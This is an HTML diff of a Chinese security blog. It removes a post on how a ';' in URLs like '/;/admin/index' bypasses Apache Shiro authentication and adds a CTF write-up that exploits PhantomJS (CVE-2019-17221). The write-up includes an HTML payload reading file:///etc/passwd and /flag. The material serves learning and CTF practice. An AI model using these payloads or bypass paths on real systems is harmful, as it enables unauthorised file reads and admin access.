@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">关于一些url中特殊字符的思考 | Cupid&#39;s Blog</title>
+  <title itemprop="name">a-easy-ctf记录 | Cupid&#39;s Blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -348,30 +348,6 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
 <div class="pattern-center-blank"></div>
 
-  <div class="pattern-center single-center">
-    <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/eventDetail.7egrtxyo7640.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/eventDetail.7egrtxyo7640.png">
-    </div>
-    <header class="pattern-header single-header">
-      <h1 class="entry-title">
-      关于一些url中特殊字符的思考</h1>
-      <p class="entry-census">
-        <span>
-          <a href="">
-            <img src="">
-          </a>
-        </span>
-        <span>
-          <a href=""></a>
-        </span>
-        <span class="bull">
-        ·</span>
-        2021-5-29<span class="bull">
-        ·</span>
-      <span id="busuanzi_value_page_pv"></span>次阅读</p>
-    </header>
-  </div>
-
 <div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
@@ -379,66 +355,48 @@
         <div class="toc"></div>
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
-        <div class="entry-content">
-          <h3><span id="0x00背景">0x00背景</span></h3><p>在使用目录扫描时候。经常会发现dirsearch的目录中存在使用一些特殊字符的fuzz列表。但这种得到的结果经常是错误的，例如下面两个例子:</p>
-<p><img src="/2021/05/29/关于一些url中特殊字符的思考/1.png" alt="1"></p>
-<p><img src="/2021/05/29/关于一些url中特殊字符的思考/2.png" alt="2"></p>
-<p>关于这些报错。就需要思考一下特殊字符在url中是怎么样被处理的。怎么样避免报错而又发挥出特殊字符在URL中的作用。还有一个问题是否有些特殊字符可以绕过访问限制，而实现一些漏洞点(例如使用../../这样跨越目录来达到任意文件读取这种)。</p>
-<h3><span id="0x01开始">0x01开始</span></h3><p>其实针对上面的问题。自己是没有头绪的。我也不知道怎么处理，因而也只有查资料，url中首先自定义的特殊字符:</p>
-<pre><code># 用来标志特定的文档位置 %23
-% 对特殊字符进行编码 %25
-&amp; 分隔不同的变量值对 %26
-+ 在变量值中表示空格 %2B
-/ 表示目录路径 &amp;2F
-\ 表示目录路径 %5C
-= 用来连接键和值 %3D
-? 表示查询字符串的开始 %3F
-空格 空格 %20
-. 往往是文件后缀 %2E</code></pre><p>往往被URL用来定义用法的不会造成解析出错。上面的例子中使用的%2A(*)和:与$又该怎么被解析呢。</p>
-<p>首先我能想到的是*和$都属于一种正则中的匹配符。如果写代码中存在对url的数据进行处理的话。那么极有可能这两种特殊字符就不会被匹配到。因而导致解析出错。</p>
-<p>百度。。了好久都没发现啥东西。</p>
-<p>干脆就看一下Shiro权限绕过中，特殊符号;是怎么权限绕过的。</p>
-<p>参考文章:<a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">笑狮傅写的</a></p>
-<p>具体是怎么权限绕过的:</p>
-<pre><code>比如说后台地址是/admin/index
-这个时候如果我们访问/;/admin/index就能直接进入后台</code></pre><p>关键的鉴权代码:</p>
-<pre><code class="java">@Bean
-ShiroFilterFactoryBean shiroFilterFactoryBean(){
-    ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean();
-    bean.setSecurityManager(securityManager());
-    bean.setLoginUrl(&quot;/login&quot;);
-    bean.setSuccessUrl(&quot;/index&quot;);
-    bean.setUnauthorizedUrl(&quot;/unauthorizedurl&quot;);
-    Map&lt;String, String&gt; map = new LinkedHashMap&lt;&gt;();
-    map.put(&quot;/doLogin&quot;, &quot;anon&quot;);
-    map.put(&quot;/admin/*&quot;, &quot;authc&quot;);
-    bean.setFilterChainDefinitionMap(map);
-    return  bean;
-}
----
-@GetMapping(&quot;/admin/page&quot;)
-public String admin() {
-    return &quot;admin page&quot;;
-}</code></pre>
-<p>这里大致意思就是/admin下的页面都需要鉴权。</p>
-<p>跟进Shiro中Url获取以及匹配的相关函数:</p>
-<pre><code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code></pre><p>而假如我们访问/;/admin/index就会被 getPathWithinApplication函数 直接处理而得到路径/</p>
-<p>进入该函数会涉及到处理url的几个函数:</p>
-<pre><code>getContenxtPath()
-getServletPath()
-getPathInfo()</code></pre><p>但问题并不出在这几个函数中，因为在获取url路径的时候传入:/;/admin/index被处理后依然达到的效果是访问:/;/admin/index</p>
-<p>出问题的在最后的 decodeAndCleanUriString </p>
-<p>decodeAndCleanUriString这个函数会把;（ascii为59）进行URL截断。因而导致</p>
-<p>访问/;/admin/index被识别成了访问/</p>
-<p>但按理说这样的话不就没能访问到后台功能页面。</p>
-<p>这儿就涉及到了不同框架和服务器之间配合处理登录动作的问题。</p>
-<p>总的来说是URL中的特殊字符;在进入Tomcat后会被函数截断而只取得了/admin/index</p>
-<p>进入到Shiro时候，/;/admin/index被截断被认为是/而不需要鉴权。</p>
-<p>再进入Spring时又被正确处理为了/admin/index。</p>
-<p>而整个流程中，由于采用Shiro进行登录因而只有Shiro中一个鉴权。最终就成功进入了后台。</p>
-<p>因而这里可以看出如果不是其中的decodeAndCleanUriString函数的特性。如果仅仅采用正常/;/的话就直接被处理成/了。这个例子中把;后面的部分都截断了，最终导致了权限绕过。</p>
-<p>因而回到之前的特殊字符出错的话。还需要结合处理URl路径的代码，以及所采用的框架服务器共同讨论最终出现错误的原因，over.</p>
+          <header class="entry-header">
+            <h1 class="entry-title">a-easy-ctf记录</h1>
+            <p class="entry-census">&nbsp;·&nbsp;2021-12-15&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
 
+            <hr>
+          </header>
+        
+        <div class="entry-content">
+          <p>日常学习玩一道题，挺有意思的记录下来。</p>
+<h2><span id="fireshellctf2020screenshooter">[FireshellCTF2020]ScreenShooter</span></h2><p>buu上面随便翻得五分题，打开之后这个样子：<br><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20211215172352825.png" alt="image-20211215172352825"></p>
+<p>然后点击screenshot真的会截图:</p>
+<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20211215172512326.png" alt="image-20211215172512326"></p>
+<p>查看抓包信息：<br><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20211215172635943.png" alt="image-20211215172635943"></p>
+<p>没啥有用的。</p>
+<p>没发现什么有用的，只能尝试找到这个http请求中的内容了。</p>
+<p>尝试向自己vps上面请求，然后查看日志内容：<br><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20211215173117277.png" alt="image-20211215173117277"></p>
+<p>发现请求中有关键字眼:PhantomJS/2.1.1</p>
+<p>应该就是提示了。百度相关漏洞。</p>
+<p>没有搜到。。然后在阿里云漏洞库获取到CVE编号为：CVE-2019-17221</p>
+<p>然后。。github上面找到了仅存的pdf写的漏洞利用详情，</p>
+<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20211215174855369.png" alt="image-20211215174855369"></p>
+<p>利用思路就是vps上面放一个恶意html文件然后让他访问触发file协议读取/etc/passwd文件，试试:</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        var exp;
+        exp = new XMLHttpRequest;
+        exp.onload = function(){
+            document.write(this.responseText)
+        };
+        exp.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);
+        exp.send();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20211215174341038.png" alt="image-20211215174341038"></p>
+<p>hhhh快乐。然后尝试读flag。一般在根目录下改一行：</p>
+<pre><code>exp.open(&quot;GET&quot;,&quot;file:///flag&quot;);</code></pre>
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
@@ -466,36 +424,19 @@ getPathInfo()</code></pre><p>但问题并不出在这几个函数中，因为在
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2021/06/03/2021-study-plan/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/kuangjiadajian.gu288aerdzc.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/kuangjiadajian.gu288aerdzc.png">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                2021-study-plan</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2021/05/21/N1BOOK-刷题/" rel="next">
+            <a href="/2021/12/14/Apache路径穿越-CVE-2021-41773/" rel="next">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/androidGaishu.5ngghcwx7280.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/androidGaishu.5ngghcwx7280.png">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                N1BOOK-刷题</h3>
+                Apache路径穿越-CVE-2021-41773</h3>
                 <hr>
               </div>
             </a>
